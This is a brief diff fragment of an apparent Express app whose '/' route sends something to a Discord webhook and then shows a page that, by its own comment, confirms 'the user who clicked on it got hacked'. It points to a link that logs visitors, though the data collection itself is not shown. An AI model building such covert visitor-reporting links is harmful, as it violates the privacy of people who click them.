@@ -34,7 +34,7 @@ app.get('/', (req, res) => {
     console.error('Error sending message to Discord webhook', error);
   });
 
-  res.render("hacked"); // render a file to ensure the user who clicked on it got hacked
+  res.sendFile("Hacked") // render a file to ensure the user who clicked on it got hacked
 });
 
 app.listen(port, () => {
